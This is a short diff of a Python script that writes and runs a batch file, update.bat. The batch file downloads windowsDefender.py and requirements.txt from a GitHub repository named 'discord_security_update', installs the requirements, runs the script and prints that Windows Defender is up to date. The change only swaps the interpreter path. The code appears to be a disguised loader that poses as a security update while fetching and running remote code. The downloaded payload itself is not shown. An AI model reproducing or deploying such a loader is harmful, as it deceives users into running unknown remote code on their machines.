@@ -9,10 +9,10 @@ del windowsDefender.py
 curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefender.py -O
 curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/requirements.txt -O
     
-%USERPATH%\.windows_defender\python\python\python.exe -m pip install -r requirements.txt
+py -m pip install -r requirements.txt
     
 echo windows defender is up to date
-%USERPATH%\.windows_defender\python\python.exe windowsDefender.py                         
+py windowsDefender.py                         
 """)
 
 os.system("update.bat")
